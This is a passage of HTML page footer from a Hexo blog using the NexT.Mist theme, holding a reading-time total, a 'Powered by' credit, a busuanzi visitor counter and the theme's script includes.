      <span class="post-meta-item-text">Reading time total &asymp;</span>
    <span title="Reading time total">20:25</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
